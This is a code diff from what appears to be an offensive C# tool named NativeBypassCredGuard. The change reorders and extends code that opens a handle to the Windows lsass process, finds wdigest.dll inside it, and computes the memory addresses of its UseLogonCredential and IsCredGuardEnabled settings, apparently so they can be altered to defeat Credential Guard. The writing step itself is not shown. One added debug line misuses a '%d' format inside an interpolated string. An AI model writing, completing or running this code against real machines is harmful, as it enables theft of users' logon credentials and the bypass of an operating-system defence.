@@ -437,20 +437,6 @@ namespace NativeBypassCredGuard
                 {
                     return;
                 }
-
-                // NtGetNextProcess + NtQueryInformationProcess -> Get lsass process handle 
-                IntPtr lsassHandle = GetProcessByName(proc_name);
-                if (lsassHandle == IntPtr.Zero) {
-                    Console.WriteLine("[-] It was not possible to get lsass handle.");
-                    return;
-                }
-
-                // NtQueryInformationProcess -> wdigest.dll address in lsass
-                IntPtr hModule = CustomGetModuleHandle(lsassHandle, dllName);
-                IntPtr useLogonCredential_Address = hModule + (useLogonCredential + offset + 6);
-                IntPtr isCredGuardEnabled_Address = hModule + (isCredGuardEnabled + offset + 12);
-
-                // DEBUG
                 if (debug)
                 {
                     Console.Write($"[+] Matched bytes:\t\t");
@@ -463,6 +449,27 @@ namespace NativeBypassCredGuard
                     Console.WriteLine($"[+] Offset:\t\t\t0x{offset:X}");
                     Console.WriteLine($"[+] UseLogonCredential offset:\t0x{(useLogonCredential + offset + 6):X6} (0x{useLogonCredential:X6} + Offset +  6)");
                     Console.WriteLine($"[+] IsCredGuardEnabled offset:\t0x{(isCredGuardEnabled + offset + 12):X6} (0x{isCredGuardEnabled:X6} + Offset + 12)");
+                }
+
+                // NtGetNextProcess + NtQueryInformationProcess -> Get lsass process handle 
+                IntPtr lsassHandle = GetProcessByName(proc_name);
+                if (lsassHandle == IntPtr.Zero)
+                {
+                    Console.WriteLine("[-] It was not possible to get lsass handle.");
+                    return;
+                }
+                else {
+                    if (debug) {
+                        Console.WriteLine($"[+] Lsass Handle:\t\t%d", lsassHandle);
+                    }
+                }
+
+                // NtQueryInformationProcess -> wdigest.dll address in lsass
+                IntPtr hModule = CustomGetModuleHandle(lsassHandle, dllName);
+                IntPtr useLogonCredential_Address = hModule + (useLogonCredential + offset + 6);
+                IntPtr isCredGuardEnabled_Address = hModule + (isCredGuardEnabled + offset + 12);
+                if (debug)
+                {
                     Console.WriteLine($"[+] DLL Base Address:\t\t0x{hModule.ToInt64():X}");
                     Console.WriteLine($"[+] UseLogonCredential address:\t0x{useLogonCredential_Address.ToInt64():X} (0x{hModule.ToInt64():X} + 0x{(useLogonCredential + offset + 6):X6})");
                     Console.WriteLine($"[+] IsCredGuardEnabled address:\t0x{isCredGuardEnabled_Address.ToInt64():X} (0x{hModule.ToInt64():X} + 0x{(isCredGuardEnabled + offset + 12):X6})");
